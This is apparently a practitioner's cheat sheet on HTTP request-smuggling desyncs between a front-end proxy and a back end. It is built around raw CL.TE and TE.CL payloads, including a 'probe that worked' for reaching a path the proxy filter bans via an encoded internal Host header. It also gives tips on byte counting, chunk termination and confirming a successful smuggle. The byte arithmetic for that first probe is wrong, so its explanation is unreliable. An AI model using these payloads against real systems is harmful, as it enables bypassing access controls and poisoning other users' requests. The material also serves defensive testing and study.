# CL/TE desync: the classic disagreement

The front end reads `Content-Length`, the back end reads `Transfer-Encoding`
(or the reverse). The bytes one layer calls "body" the other calls "next
request".

## The measurement shape

Always send the ambiguous request **in one TCP write** and count the HTTP
status lines that come back — a real desync produces a response for a request
the front end never saw.

**Probe that worked** (Proxy):

```text
POST /allowed HTTP/1.1
Host: target
Content-Length: 7
Content-Type: application/json

{"a":1}

POST /banned-by-proxy-filter HTTP/1.1
Host: <alternate-encoded-internal-address>
Content-Length: 5

x=1
```

`{"a":1}` is 6 bytes + `\r\n` = 8, but `Content-Length: 7` leaves the front end
one byte short — so the front waits for one more byte while the back has already
consumed past it.

## CL.TE — the front honors CL, the back honors TE

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

Front: `Content-Length: 6` → body is `0\r\n\r\nG` (6 bytes) → forwards.
Back: `Transfer-Encoding: chunked` → reads `0` as chunk-size 0 → terminates →
`G` starts a NEW request → `GPOST` is malformed → hangs or errors.

The `G` is a poison prefix — the NEXT request on the connection inherits it.

## TE.CL — the front honors TE, the back honors CL

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

Front: chunked — `5c` = 92 bytes of chunk data (which swallows the whole
smuggled request plus more) → forwards. Back: `Content-Length: 4` → body is
`5c\r\n` → the rest (`GPOST ...`) is a NEW request → the full smuggle lands.

## The byte-counting trap — the #1 failure

`Content-Length` counts BYTES, not characters. Every CRLF = 2 bytes. A one-
byte-off CL either drops the body silently or hangs the connection.

Count the body bytes explicitly:

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
...
```

`5c\r\n` = 4 bytes → `Content-Length: 4`. If the CL is 3 the back drops the
`\n` — if 5 the back eats a byte of the next request.

## The chunk-size grammar — hex, not decimal

`5c` = 92 in decimal — chunk sizes are hex. A mistake is writing `60` when
you mean 60 bytes (which is `3c`). Always convert to hex.

## The 0-chunk terminator — what ends a chunked body

```text
5c
<92 bytes>
0

```

`0\r\n\r\n` terminates the chunked body. The trailing CRLF after the 0-chunk
is required — without it the body never ends → hang.

## The trailing-fragment — what completes the smuggle

After the smuggled request, append a fragment so the connection doesn't hang
waiting for the smuggle's own terminator:

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /smuggled HTTP/1.1
Host: t
Content-Length: 5

x=1
0

GET / HTTP/1.1
```

The trailing `GET /` gives the connection something to close on — without it
the smuggled request's own framing is unbounded.

## The keep-alive interaction — pipelined sockets

Desync only happens on a reused (keep-alive) connection — the front-end
forwards multiple requests over one socket. A connection that closes after
each request can't desync (there's no "next request" to poison). Check the
`Connection:` header and the front-end's pooling behavior.

## The Content-Type interaction — the body-type trap

`application/x-www-form-urlencoded` vs `application/json` vs `multipart` —
the body-type affects whether the parser strips trailing whitespace or
rejects a bare `0` chunk. A desync that works on `text/plain` may fail on
`application/json` if the back-end validates the body.

## The common confirmation — the second-response

A real desync shows as: request 1 → response 1 (normal), then a SECOND
response the front never asked for — or the next normal request's response
carries the smuggle's output. The status-pair is the signal.
